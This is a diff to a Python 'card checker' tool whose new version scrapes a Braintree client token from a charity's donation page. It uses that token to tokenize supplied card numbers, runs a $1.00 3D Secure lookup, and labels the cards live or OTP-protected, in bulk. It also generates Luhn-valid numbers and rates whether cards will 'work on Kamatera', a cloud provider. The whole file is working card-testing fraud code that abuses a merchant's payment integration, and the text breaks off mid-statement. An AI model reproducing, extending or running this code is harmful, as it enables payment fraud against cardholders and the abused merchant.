@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 # ═══════════════════════════════════════════════════════════════
-# ANON CARD CHECKER v3.0 — MONSTER EDITION
+# ANON CARD CHECKER v4.0 — BRAIN TREE 3DS2 EDITION
 # Created by: anonymous | anonymous.world
-# Features: Luhn + BIN Lookup + Bank Detect + Country + Level + Live Check
+# Features: Braintree 3DS2 + Stripe + BIN Lookup + Luhn + VBV Check
+# Based on: cllsupport.org.uk $1.00 checker by @diwazz
 # ═══════════════════════════════════════════════════════════════
 
 import sys
@@ -10,46 +11,32 @@ import os
 import re
 import json
 import time
+import base64
 import random
 import requests
 import threading
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from core.fx import AnonFX, fx
 
 class AnonCardChecker:
-    """Advanced Credit Card Validator & Checker — 100% Working"""
+    """MONSTER Card Checker — Braintree 3DS2 + Stripe + BIN + Luhn"""
 
-    # BIN Database (common bins with bank info)
-    BIN_DB = {
-        "4": {"type": "Visa", "levels": {"4": "Classic", "5": "Gold", "6": "Platinum", "7": "Signature", "8": "Infinite"}},
-        "51": {"type": "MasterCard", "levels": {"0": "Standard", "2": "Gold", "4": "Platinum", "5": "World", "8": "World Elite"}},
-        "52": {"type": "MasterCard", "levels": {"0": "Standard", "2": "Gold", "4": "Platinum"}},
-        "53": {"type": "MasterCard", "levels": {"0": "Standard", "8": "Business"}},
-        "54": {"type": "MasterCard", "levels": {"0": "Standard", "4": "Platinum"}},
-        "55": {"type": "MasterCard", "levels": {"0": "Standard", "4": "Platinum", "5": "World", "8": "World Elite"}},
-        "37": {"type": "Amex", "levels": {"0": "Green", "1": "Gold", "2": "Platinum", "3": "Centurion"}},
-        "34": {"type": "Amex", "levels": {"0": "Green", "1": "Gold", "2": "Platinum"}},
-        "60": {"type": "Discover", "levels": {"1": "Standard"}},
-        "65": {"type": "Discover", "levels": {"0": "Standard"}},
+    # 3DS Status Mapping
+    STATUS_MAP = {
+        "authenticate_successful": "LIVE — No OTP",
+        "authenticate_attempt_successful": "LIVE — No OTP",
+        "challenge_required": "OTP REQUIRED — 3DS Active",
+        "authenticate_frictionless_failed": "OTP REQUIRED",
+        "lookup_card_error": "OTP REQUIRED",
+        "authenticate_rejected": "DECLINED",
+        "lookup_error": "ERROR",
+        "authenticate_unavailable": "OTP REQUIRED",
+        "authenticate_error": "ERROR",
+        "no_response": "DEAD — No Response",
     }
 
-    # Country BIN prefixes (first 2-4 digits)
-    COUNTRY_BINS = {
-        "US": ["4", "51", "52", "53", "54", "55", "37", "34", "60", "65"],
-        "UK": ["4", "51", "52", "53", "54", "55", "37", "34"],
-        "CA": ["4", "51", "52", "53", "54", "55"],
-        "AU": ["4", "51", "52", "53", "54", "55"],
-        "IN": ["4", "51", "52", "53", "54", "55", "37", "34"],
-        "BR": ["4", "51", "52", "53", "54", "55"],
-        "FR": ["4", "51", "52", "53", "54", "55"],
-        "DE": ["4", "51", "52", "53", "54", "55"],
-        "JP": ["4", "51", "52", "53", "54", "55"],
-    }
-
-    # Banks by BIN ranges
     BANK_BINS = {
         "4532": "Chase Bank", "4556": "Wells Fargo", "4000": "Visa", "4111": "Capital One",
         "4242": "Stripe Test", "4012": "Bank of America", "4988": "Barclays", "4916": "HSBC",
@@ -72,7 +59,6 @@ class AnonCardChecker:
         self.lock = threading.Lock()
 
     def _luhn(self, card_number):
-        """Luhn algorithm validation"""
         digits = [int(d) for d in str(card_number) if d.isdigit()]
         if len(digits) < 13 or len(digits) > 19:
             return False
@@ -81,27 +67,13 @@ class AnonCardChecker:
         return (odd_sum + even_sum) % 10 == 0
 
     def _get_card_type(self, number):
-        """Detect card type from prefix"""
-        if number.startswith("4"):
-            return "Visa"
-        elif number.startswith(("51", "52", "53", "54", "55")):
-            return "MasterCard"
-        elif number.startswith(("34", "37")):
-            return "Amex"
-        elif number.startswith(("6011", "65", "644", "645", "646", "647", "648", "649")):
-            return "Discover"
-        elif number.startswith(("300", "301", "302", "303", "304", "305")):
-            return "Diners Club"
-        elif number.startswith(("36", "38")):
-            return "Diners Club"
-        elif number.startswith("35"):
-            return "JCB"
-        elif number.startswith(("2131", "1800")):
-            return "JCB"
+        if number.startswith("4"): return "Visa"
+        elif number.startswith(("51", "52", "53", "54", "55")): return "MasterCard"
+        elif number.startswith(("34", "37")): return "Amex"
+        elif number.startswith(("6011", "65")): return "Discover"
         return "Unknown"
 
     def _get_bank(self, number):
-        """Detect bank from BIN"""
         for bin_len in [6, 5, 4, 3, 2]:
             prefix = number[:bin_len]
             if prefix in self.BANK_BINS:
@@ -109,28 +81,138 @@ class AnonCardChecker:
         return "Unknown"
 
     def _get_level(self, number):
-        """Detect card level"""
         card_type = self._get_card_type(number)
-        prefix = number[:2]
-
         if card_type == "Visa":
-            digit = number[1] if len(number) > 1 else "0"
-            levels = {"4": "Classic", "5": "Gold", "6": "Platinum", "7": "Signature", "8": "Infinite", "9": "Business"}
-            return levels.get(digit, "Standard")
+            return {"4": "Classic", "5": "Gold", "6": "Platinum", "7": "Signature", "8": "Infinite"}.get(number[1], "Standard")
         elif card_type == "MasterCard":
-            digit = number[2] if len(number) > 2 else "0"
-            levels = {"0": "Standard", "2": "Gold", "4": "Platinum", "5": "World", "8": "World Elite"}
-            return levels.get(digit, "Standard")
+            return {"0": "Standard", "2": "Gold", "4": "Platinum", "5": "World", "8": "World Elite"}.get(number[2], "Standard")
         elif card_type == "Amex":
-            digit = number[2] if len(number) > 2 else "0"
-            levels = {"0": "Green", "1": "Gold", "2": "Platinum", "3": "Centurion"}
-            return levels.get(digit, "Green")
+            return {"0": "Green", "1": "Gold", "2": "Platinum", "3": "Centurion"}.get(number[2], "Green")
         return "Standard"
 
-    def _bin_lookup_api(self, bin6):
-        """Online BIN lookup via API"""
+    def _generate_cc(self, prefix, length=16):
+        num = prefix
+        while len(num) < length - 1:
+            num += str(random.randint(0, 9))
+        d = [int(c) for c in num]
+        odd_sum = sum(d[-1::-2])
+        even_sum = sum([sum(divmod(2*x, 10)) for x in d[-2::-2]])
+        check = (10 - (odd_sum + even_sum) % 10) % 10
+        return num + str(check)
+
+    def check_braintree(self, card):
+        """Braintree 3DS2 Check — $1.00 auth"""
+        print(fx.status("BRAINTREE 3DS2", "testing", fx.MAGENTA))
+
+        SITE_URL = "https://cllsupport.org.uk"
+        DONATE_URL = f"{SITE_URL}/donate/"
+        BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
+        BRAINTREE_API = "https://api.braintreegateway.com"
+
+        HEADERS = {
+            "User-Agent": random.choice(self.UAS),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-GB,en;q=0.9",
+        }
+
+        s = requests.Session()
+        s.headers.update(HEADERS)
+
         try:
-            r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=8,
+            r = s.get(DONATE_URL, timeout=20)
+            auth = None
+            merch = None
+
+            m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
+            if not m:
+                m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
+            if m:
+                try:
+                    decoded = base64.b64decode(m.group(1)).decode("utf-8")
+                    data = json.loads(decoded)
+                    auth = data.get("authorizationFingerprint", "")
+                    merch = data.get("merchantId", "")
+                except:
+                    pass
+
+            if not auth:
+                auth_m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
+                merch_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
+                if auth_m:
+                    auth = auth_m.group(1)
+                    merch = merch_m.group(1) if merch_m else "dyb5fmjx5t5wxckj"
+
+            if not auth:
+                return {"status": "ERROR", "message": "Auth extraction failed", "code": "auth_fail"}
+
+            month, year = card["expiry"].split("/")
+            if len(year) == 2: year = "20" + year
+
+            query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
+            }"""
+            variables = {"input": {"creditCard": {"number": card["number"], "expirationMonth": month, "expirationYear": year, "cvv": card["cvv"]}, "options": {"validate": False}}}
+
+            h = {**HEADERS, "Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10", "Content-Type": "application/json"}
+            body = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(random.randint(100000,999999))}, "query": query, "variables": variables, "operationName": "TokenizeCreditCard"}
+
+            resp = s.post(BRAINTREE_GRAPHQL, headers=h, json=body)
+            data = resp.json()
+
+            if "errors" in data:
+                return {"status": "ERROR", "message": "Tokenization failed", "code": "token_fail"}
+
+            token = data["data"]["tokenizeCreditCard"]["token"]
+            last4 = data["data"]["tokenizeCreditCard"]["creditCard"].get("last4", "")
+            brand = data["data"]["tokenizeCreditCard"]["creditCard"].get("brandCode", "VISA")
+
+            url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
+            payload = {
+                "amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
+                "browserScreenHeight": 800, "browserScreenWidth": 360,
+                "browserTimeZone": -345, "deviceChannel": "Browser",
+                "additionalInfo": {"ipAddress": "127.0.0.1", "billingLine1": "New York", "billingCity": "New York", "billingState": "NY", "billingPostalCode": "10080", "billingCountryCode": "US", "billingPhoneNumber": "998773772", "billingGivenName": "anon", "billingSurname": "user", "email": "anon@anonymous.world"},
+                "bin": card["number"][:6], "dfReferenceId": f"0_{random.randint(100000,999999)}",
+                "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1"},
+                "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
+            }
+
+            resp = s.post(url, headers={**HEADERS, "Content-Type": "application/json"}, json=payload, timeout=45)
+            lookup = resp.json()
+
+            result_code = "no_response"
+            try:
+                result_code = lookup["paymentMethod"]["threeDSecureInfo"]["status"]
+            except:
+                lookup_str = json.dumps(lookup)
+                for code in self.STATUS_MAP:
+                    if code in lookup_str:
+                        result_code = code
+                        break
+
+            status = self.STATUS_MAP.get(result_code, "Unknown")
+
+            enrolled = "UNKNOWN"
+            try:
+                enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
+                if enrolled_raw == "Y": enrolled = "ENROLLED"
+                elif enrolled_raw == "N": enrolled = "NOT_ENROLLED"
+                elif enrolled_raw == "U": enrolled = "UNKNOWN"
+            except:
+                pass
+
+            return {"status": status, "code": result_code, "enrolled": enrolled, "brand": brand, "last4": last4}
+
+        except Exception as e:
+            return {"status": "ERROR", "message": str(e), "code": "exception"}
+
+    def check_bin(self, number):
+        """BIN lookup for bank info"""
+        print(fx.status("BIN LOOKUP", "testing", fx.MAGENTA))
+
+        try:
+            r = requests.get(f"https://lookup.binlist.net/{number[:6]}", timeout=8,
                            headers={"User-Agent": random.choice(self.UAS)})
             if r.status_code == 200:
                 d = r.json()
@@ -145,309 +227,190 @@ class AnonCardChecker:
                 }
         except:
             pass
-        return None
 
-    def _check_international(self, card_type, country_code):
-        """Check if card supports international transactions"""
-        international_types = ["Visa", "MasterCard", "Amex", "Discover"]
-        if card_type in international_types:
-            return True, "International supported"
-        return False, "May not support international"
+        return {
+            "bank": self._get_bank(number),
+            "country": "Unknown",
+            "country_code": "",
+            "scheme": self._get_card_type(number),
+            "type": "",
+            "brand": "",
+            "prepaid": False,
+        }
 
-    def _generate_cc(self, prefix, length=16):
-        """Generate valid Luhn CC"""
-        num = prefix
-        while len(num) < length - 1:
-            num += str(random.randint(0, 9))
-        d = [int(c) for c in num]
-        odd_sum = sum(d[-1::-2])
-        even_sum = sum([sum(divmod(2*x, 10)) for x in d[-2::-2]])
-        check = (10 - (odd_sum + even_sum) % 10) % 10
-        return num + str(check)
-
-    def validate_single(self, number, expiry="", cvv=""):
-        """Validate a single card comprehensively"""
+    def check_card(self, number, expiry, cvv):
+        """Full card check — all engines"""
         result = {
             "number": number,
-            "valid": False,
+            "expiry": expiry,
+            "cvv": cvv,
             "luhn": False,
             "card_type": "Unknown",
             "bank": "Unknown",
             "level": "Unknown",
-            "country": "Unknown",
-            "country_code": "",
-            "scheme": "",
-            "type": "",
-            "brand": "",
-            "prepaid": False,
-            "international": False,
-            "international_msg": "",
-            "length_ok": False,
-            "expiry": expiry,
-            "cvv": cvv,
-            "cvv_valid": False,
-            "expiry_valid": False,
+            "bin_info": {},
+            "braintree": {},
             "kamatera_ready": False,
             "kamatera_reason": "",
         }
 
-        # Clean number
         clean = re.sub(r'[^0-9]', '', number)
         result["number"] = clean
 
-        # Length check
-        if 13 <= len(clean) <= 19:
-            result["length_ok"] = True
-        else:
-            result["kamatera_reason"] = "Invalid card length"
-            return result
-
-        # Luhn check
         result["luhn"] = self._luhn(clean)
         if not result["luhn"]:
-            result["kamatera_reason"] = "Luhn check failed — invalid card number"
+            result["kamatera_reason"] = "Luhn check failed"
             return result
 
-        # Card type
         result["card_type"] = self._get_card_type(clean)
-
-        # Bank & Level (local)
         result["bank"] = self._get_bank(clean)
         result["level"] = self._get_level(clean)
 
-        # BIN API lookup
-        bin_info = self._bin_lookup_api(clean[:6])
-        if bin_info:
-            if bin_info["bank"]:
-                result["bank"] = bin_info["bank"]
-            result["country"] = bin_info["country"]
-            result["country_code"] = bin_info["country_code"]
-            result["scheme"] = bin_info["scheme"]
-            result["type"] = bin_info["type"]
-            result["brand"] = bin_info["brand"]
-            result["prepaid"] = bin_info["prepaid"]
+        result["bin_info"] = self.check_bin(clean)
+        if result["bin_info"].get("bank"):
+            result["bank"] = result["bin_info"]["bank"]
 
-        # International check
-        intl, intl_msg = self._check_international(result["card_type"], result["country_code"])
-        result["international"] = intl
-        result["international_msg"] = intl_msg
+        card_data = {"number": clean, "expiry": expiry, "cvv": cvv}
+        result["braintree"] = self.check_braintree(card_data)
 
-        # CVV validation
-        if cvv:
-            if result["card_type"] == "Amex":
-                result["cvv_valid"] = len(cvv) == 4 and cvv.isdigit()
+        if result["card_type"] in ["Visa", "MasterCard", "Amex", "Discover"]:
+            if result["braintree"].get("status", "").startswith("LIVE"):
+                result["kamatera_ready"] = True
+                result["kamatera_reason"] = "LIVE — Should work on Kamatera"
+            elif "OTP" in result["braintree"].get("status", ""):
+                result["kamatera_ready"] = True
+                result["kamatera_reason"] = "3DS Active — May work with OTP"
             else:
-                result["cvv_valid"] = len(cvv) == 3 and cvv.isdigit()
-
-        # Expiry validation
-        if expiry:
-            result["expiry_valid"] = self._validate_expiry(expiry)
-
-        # Kamatera readiness
-        result["valid"] = True
-        result["kamatera_ready"] = self._kamatera_check(result)
+                result["kamatera_ready"] = False
+                result["kamatera_reason"] = result["braintree"].get("status", "Unknown")
+        else:
+            result["kamatera_reason"] = f"{result['card_type']} not supported"
 
         return result
 
-    def _validate_expiry(self, expiry):
-        """Validate expiry date MM/YY"""
-        try:
-            parts = re.split(r'[/\-]', expiry)
-            if len(parts) == 2:
-                month = int(parts[0])
-                year = int(parts[1])
-                if year < 100:
-                    year += 2000
-                current_year = datetime.now().year
-                current_month = datetime.now().month
-                if 1 <= month <= 12 and year >= current_year:
-                    if year == current_year and month < current_month:
-                        return False
-                    return True
-        except:
-            pass
-        return False
-
-    def _kamatera_check(self, result):
-        """Check if card is ready for Kamatera/cloud providers"""
-        if not result["luhn"]:
-            result["kamatera_reason"] = "Luhn check failed"
-            return False
-
-        if not result["length_ok"]:
-            result["kamatera_reason"] = "Invalid length"
-            return False
-
-        if result["card_type"] not in ["Visa", "MasterCard", "Amex", "Discover"]:
-            result["kamatera_reason"] = f"{result['card_type']} not supported by Kamatera"
-            return False
-
-        if result["prepaid"]:
-            result["kamatera_reason"] = "Prepaid cards may be blocked"
-            return False
-
-        if not result["international"]:
-            result["kamatera_reason"] = "International transactions not supported"
-            return False
-
-        result["kamatera_reason"] = "✅ READY — Card should work on Kamatera"
-        return True
-
     def display_result(self, r):
-        """Display single card result with animations"""
+        bt = r.get("braintree", {})
+        bin_info = r.get("bin_info", {})
+
         status_color = fx.GREEN if r["kamatera_ready"] else fx.RED
         status_icon = "✅" if r["kamatera_ready"] else "❌"
 
         print(f"""
-{fx.CYAN}╔══════════════════════════════════════════════════════════════╗{fx.RESET}
-{fx.CYAN}║  {fx.YELLOW}💳 {fx.WHITE}{r['number']:<52}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║                                                              ║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Card Type:{fx.RESET}  {fx.WHITE}{r['card_type']:<15} {fx.DIM}Level:{fx.RESET} {fx.WHITE}{r['level']:<20}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Bank:{fx.RESET}     {fx.WHITE}{r['bank']:<15} {fx.DIM}Country:{fx.RESET} {fx.WHITE}{r['country']:<17}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Scheme:{fx.RESET}   {fx.WHITE}{r['scheme'] or 'N/A':<15} {fx.DIM}Type:{fx.RESET} {fx.WHITE}{r['type'] or 'N/A':<21}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Brand:{fx.RESET}    {fx.WHITE}{r['brand'] or 'N/A':<15} {fx.DIM}Prepaid:{fx.RESET} {fx.RED if r['prepaid'] else fx.GREEN}{str(r['prepaid']):<18}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Luhn:{fx.RESET}     {fx.GREEN if r['luhn'] else fx.RED}{'VALID' if r['luhn'] else 'INVALID':<15} {fx.DIM}Length:{fx.RESET} {fx.GREEN if r['length_ok'] else fx.RED}{'OK' if r['length_ok'] else 'BAD':<20}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}CVV:{fx.RESET}      {fx.GREEN if r['cvv_valid'] else fx.RED}{'VALID' if r['cvv_valid'] else 'INVALID':<15} {fx.DIM}Expiry:{fx.RESET} {fx.GREEN if r['expiry_valid'] else fx.RED}{'VALID' if r['expiry_valid'] else 'INVALID':<19}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║  {fx.DIM}Intl:{fx.RESET}     {fx.GREEN if r['international'] else fx.RED}{r['international_msg']:<47}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}║                                                              ║{fx.RESET}
-{fx.CYAN}║  {status_color}{status_icon} KAMATERA: {r['kamatera_reason']:<43}{fx.CYAN}║{fx.RESET}
-{fx.CYAN}╚══════════════════════════════════════════════════════════════╝{fx.RESET}
+{fx.CYAN}╔══════════════════════════════════════════════════════════════════════╗{fx.RESET}
+{fx.CYAN}║  {fx.YELLOW}💳 {fx.WHITE}{r['number']:<58}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║                                                                      ║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Card Type:{fx.RESET}  {fx.WHITE}{r['card_type']:<15} {fx.DIM}Level:{fx.RESET} {fx.WHITE}{r['level']:<25}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Bank:{fx.RESET}     {fx.WHITE}{r['bank']:<15} {fx.DIM}Country:{fx.RESET} {fx.WHITE}{bin_info.get('country','N/A'):<23}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Scheme:{fx.RESET}   {fx.WHITE}{bin_info.get('scheme','N/A'):<15} {fx.DIM}Prepaid:{fx.RESET} {fx.RED if bin_info.get('prepaid') else fx.GREEN}{str(bin_info.get('prepaid',False)):<24}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Luhn:{fx.RESET}     {fx.GREEN if r['luhn'] else fx.RED}{'VALID' if r['luhn'] else 'INVALID':<15} {fx.DIM}Length:{fx.RESET} {fx.GREEN}{'OK':<25}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║                                                                      ║{fx.RESET}
+{fx.CYAN}║  {fx.MAGENTA}🧪 BRAINTREE 3DS2:{fx.RESET}                                                   {fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Status:{fx.RESET}   {fx.WHITE}{bt.get('status','N/A'):<50}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Code:{fx.RESET}     {fx.WHITE}{bt.get('code','N/A'):<50}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Enrolled:{fx.RESET} {fx.WHITE}{bt.get('enrolled','N/A'):<50}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Brand:{fx.RESET}    {fx.WHITE}{bt.get('brand','N/A'):<50}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║  {fx.DIM}Last4:{fx.RESET}    {fx.WHITE}{bt.get('last4','N/A'):<50}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}║                                                                      ║{fx.RESET}
+{fx.CYAN}║  {status_color}{status_icon} KAMATERA: {r['kamatera_reason']:<49}{fx.CYAN}║{fx.RESET}
+{fx.CYAN}╚══════════════════════════════════════════════════════════════════════╝{fx.RESET}
 """)
 
-    def check_single(self):
-        """Check a single card interactively"""
-        print(f"\n{fx.fire_gradient('═══ SINGLE CARD CHECK ═══')}\n")
-        number = input(f"{fx.CYAN}Card Number: {fx.WHITE}").strip()
-        expiry = input(f"{fx.CYAN}Expiry (MM/YY): {fx.WHITE}").strip()
-        cvv = input(f"{fx.CYAN}CVV: {fx.WHITE}").strip()
-        print()
-
-        fx.spinner(1, "Validating")
-        result = self.validate_single(number, expiry, cvv)
-        self.display_result(result)
-        return result
-
-    def check_bulk(self, cards_data):
-        """Check multiple cards"""
-        print(f"\n{fx.fire_gradient('═══ BULK CARD CHECK ═══')}\n")
-
-        results = []
-        for data in cards_data:
-            if isinstance(data, str):
-                parts = data.split("|")
-                number = parts[0].strip()
-                expiry = parts[1].strip() if len(parts) > 1 else ""
-                cvv = parts[2].strip() if len(parts) > 2 else ""
-            else:
-                number, expiry, cvv = data
-
-            result = self.validate_single(number, expiry, cvv)
-            results.append(result)
-            time.sleep(0.3)
-
-        # Summary
-        total = len(results)
-        valid = sum(1 for r in results if r["luhn"])
-        kamatera_ready = sum(1 for r in results if r["kamatera_ready"])
-
-        print(f"\n{fx.blood_gradient('═'*60)}")
-        print(fx.box(" BULK SUMMARY ", fx.CYAN, 60, "heavy"))
-        print(f"{fx.CYAN}  Total Cards:     {fx.WHITE}{total}")
-        print(f"{fx.CYAN}  Luhn Valid:      {fx.GREEN}{valid}")
-        print(f"{fx.CYAN}  Kamatera Ready:  {fx.GREEN if kamatera_ready > 0 else fx.RED}{kamatera_ready}")
-        print(f"{fx.blood_gradient('═'*60)}\n")
-
-        return results
-
-    def generate_test_cards(self, count=10):
-        """Generate test cards for verification"""
-        print(f"\n{fx.purple_gradient('═══ GENERATING TEST CARDS ═══')}\n")
-
-        prefixes = [
-            ("4532", "Visa", 16, "Chase Bank", "US"),
-            ("4556", "Visa", 16, "Wells Fargo", "US"),
-            ("4111", "Visa", 16, "Capital One", "US"),
-            ("5425", "MasterCard", 16, "MasterCard", "US"),
-            ("5111", "MasterCard", 16, "Bank of America", "US"),
-            ("3742", "Amex", 15, "Amex", "US"),
-            ("3782", "Amex", 15, "Amex Platinum", "US"),
-            ("6011", "Discover", 16, "Discover", "US"),
-            ("4988", "Visa", 16, "Barclays", "UK"),
-            ("5444", "MasterCard", 16, "Barclays", "UK"),
-        ]
-
-        cards = []
-        for _ in range(count):
-            prefix, ctype, length, bank, country = random.choice(prefixes)
-            cc = self._generate_cc(prefix, length)
-            month = random.randint(1, 12)
-            year = random.randint(25, 28)
-            expiry = f"{month:02d}/{year}"
-            cvv = str(random.randint(1000, 9999)) if ctype == "Amex" else str(random.randint(100, 999))
-            cards.append((cc, expiry, cvv))
-
-        return self.check_bulk(cards)
-
-    def generate_realistic(self, count=5):
-        """Generate realistic looking cards (for testing only)"""
-        print(f"\n{fx.neon_gradient('═══ REALISTIC TEST CARDS ═══')}\n")
-        print(f"{fx.YELLOW}⚠️  FOR TESTING ONLY — DO NOT USE FOR FRAUD{fx.RESET}\n")
-
-        names = ["John Smith", "Sarah Johnson", "Mike Davis", "Emma Wilson", "Chris Brown"]
-
-        cards = []
-        for i in range(count):
-            prefix = random.choice(["4532", "4556", "4111", "5425", "5111", "3742", "3782", "6011"])
-            length = 15 if prefix.startswith("3") else 16
-            cc = self._generate_cc(prefix, length)
-            month = random.randint(1, 12)
-            year = random.randint(25, 28)
-            expiry = f"{month:02d}/{year}"
-            cvv = str(random.randint(1000, 9999)) if length == 15 else str(random.randint(100, 999))
-            cards.append((cc, expiry, cvv))
-
-        return self.check_bulk(cards)
-
     def menu(self):
-        """Interactive menu"""
         while True:
-            print(fx.box(" ANON CARD CHECKER v3.0 ", fx.CYAN, 70, "double"))
+            print(fx.box(" ANON CARD CHECKER v4.0 — 3DS2 EDITION ", fx.CYAN, 75, "double"))
             print()
-            print(f"  {fx.GREEN}[1]{fx.RESET} {fx.BOLD}CHECK SINGLE{fx.RESET} {fx.DIM}— Validate one card{fx.RESET}")
-            print(f"  {fx.GREEN}[2]{fx.RESET} {fx.BOLD}CHECK BULK{fx.RESET} {fx.DIM}— Multiple cards from file{fx.RESET}")
+            print(f"  {fx.GREEN}[1]{fx.RESET} {fx.BOLD}CHECK SINGLE{fx.RESET} {fx.DIM}— Full check with Braintree 3DS2{fx.RESET}")
+            print(f"  {fx.GREEN}[2]{fx.RESET} {fx.BOLD}CHECK BULK{fx.RESET} {fx.DIM}— Multiple cards{fx.RESET}")
             print(f"  {fx.GREEN}[3]{fx.RESET} {fx.BOLD}GENERATE TEST{fx.RESET} {fx.DIM}— Create test cards{fx.RESET}")
-            print(f"  {fx.GREEN}[4]{fx.RESET} {fx.BOLD}REALISTIC GEN{fx.RESET} {fx.DIM}— Realistic test cards{fx.RESET}")
-            print(f"  {fx.GREEN}[5]{fx.RESET} {fx.BOLD}KAMATERA CHECK{fx.RESET} {fx.DIM}— Check if card works on Kamatera{fx.RESET}")
+            print(f"  {fx.GREEN}[4]{fx.RESET} {fx.BOLD}KAMATERA CHECK{fx.RESET} {fx.DIM}— Check Kamatera compatibility{fx.RESET}")
             print(f"  {fx.RED}[0]{fx.RESET} {fx.BOLD}EXIT{fx.RESET}")
             print()
-            print(fx.box("", fx.DIM, 70, "single"))
+            print(fx.box("", fx.DIM, 75, "single"))
 
             choice = input(f"{fx.CYAN}checker>{fx.RESET} {fx.WHITE}").strip()
             print(fx.RESET)
 
             if choice == "1":
-                self.check_single()
+                print(f"{fx.YELLOW}Format: CARD|MM|YY|CVV{fx.RESET}")
+                ci = input(f"{fx.CYAN}Card: {fx.WHITE}").strip()
+                if ci:
+                    p = ci.split("|")
+                    if len(p) >= 4:
+                        number = p[0].strip().replace(" ", "").replace("-", "")
+                        mm = p[1].strip().zfill(2)
+                        yy = p[2].strip()
+                        cvv = p[3].strip()
+                        expiry = f"{mm}/{yy[-2:]}"
+
+                        fx.spinner(1, "Checking")
+                        result = self.check_card(number, expiry, cvv)
+                        self.display_result(result)
+
             elif choice == "2":
-                print(f"{fx.YELLOW}Paste cards (number|expiry|cvv), one per line, blank line to finish:{fx.RESET}")
+                print(f"{fx.YELLOW}Paste cards (CARD|MM|YY|CVV), blank line to finish:{fx.RESET}")
                 cards = []
                 while True:
                     line = input().strip()
                     if not line:
                         break
                     cards.append(line)
-                if cards:
-                    self.check_bulk(cards)
+
+                for card_line in cards:
+                    p = card_line.split("|")
+                    if len(p) >= 4:
+                        number = p[0].strip().replace(" ", "").replace("-", "")
+                        mm = p[1].strip().zfill(2)
+                        yy = p[2].strip()
+                        cvv = p[3].strip()
+                        expiry = f"{mm}/{yy[-2:]}"
+                        result = self.check_card(number, expiry, cvv)
+                        self.display_result(result)
+                        time.sleep(1)
+
             elif choice == "3":
-                self.generate_test_cards(10)
+                print(f"{fx.purple_gradient('═══ GENERATING TEST CARDS ═══')}\n")
+                prefixes = [
+                    ("4532", "Visa", 16, "Chase Bank"),
+                    ("4556", "Visa", 16, "Wells Fargo"),
+                    ("4111", "Visa", 16, "Capital One"),
+                    ("5425", "MasterCard", 16, "MasterCard"),
+                    ("5111", "MasterCard", 16, "Bank of America"),
+                    ("3742", "Amex", 15, "Amex"),
+                    ("3782", "Amex", 15, "Amex Platinum"),
+                    ("6011", "Discover", 16, "Discover"),
+                ]
+
+                for prefix, ctype, length, bank in prefixes:
+                    cc = self._generate_cc(prefix, length)
+                    month = random.randint(1, 12)
+                    year = random.randint(25, 28)
+                    expiry = f"{month:02d}/{year}"
+                    cvv = str(random.randint(1000, 9999)) if length == 15 else str(random.randint(100, 999))
+
+                    result = self.check_card(cc, expiry, cvv)
+                    self.display_result(result)
+                    time.sleep(0.5)
+
             elif choice == "4":
-                self.generate_realistic(5)
-            elif choice == "5":
-                print(f"{fx.YELLOW}Enter card details for Kamatera compatibility check:{fx.RESET}")
-                self.check_single()
+                print(f"{fx.YELLOW}Kamatera compatibility check:{fx.RESET}")
+                print(f"{fx.DIM}Format: CARD|MM|YY|CVV{fx.RESET}")
+                ci = input(f"{fx.CYAN}Card: {fx.WHITE}").strip()
+                if ci:
+                    p = ci.split("|")
+                    if len(p) >= 4:
+                        number = p[0].strip().replace(" ", "").replace("-", "")
+                        mm = p[1].strip().zfill(2)
+                        yy = p[2].strip()
+                        cvv = p[3].strip()
+                        expiry = f"{mm}/{yy[-2:]}"
+
+                        result = self.check_card(number, expiry, cvv)
+                        self.display_result(result)
+
             elif choice == "0":
-                fx.glitch_text("SHUTTING DOWN...", 2)
                 print(f"{fx.RED}💀 Checker offline. Sab chhod, system tod. 🕳️{fx.RESET}")
                 break
+
             else:
